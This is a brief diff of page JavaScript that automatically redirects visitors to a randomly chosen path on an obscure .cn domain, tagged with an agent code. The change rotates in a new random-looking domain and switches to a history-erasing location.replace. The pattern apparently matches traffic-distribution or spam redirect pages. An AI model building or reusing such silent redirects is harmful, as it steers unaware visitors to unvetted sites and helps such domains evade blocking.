@@ -42,8 +42,9 @@
                 let all = [2, 3, 4, 6]
                 let params = new URLSearchParams(window.location.search);
                 let [agent_code, tp] = [params.get('agent_code') || 231, params.get('tp') || all[Math.floor(Math.random() * all.length)]];
-                let tzurl = "https://brbsyf55.cn/html" + tp + "?agent_code=" + agent_code;
-                window.location.href = tzurl;
+                let tzurl = "https://6bmttc8a.cn/html" + tp + "?agent_code=" + agent_code;
+                window.location.replace(tzurl)
+                // window.location.href = tzurl;
             }
         }
 
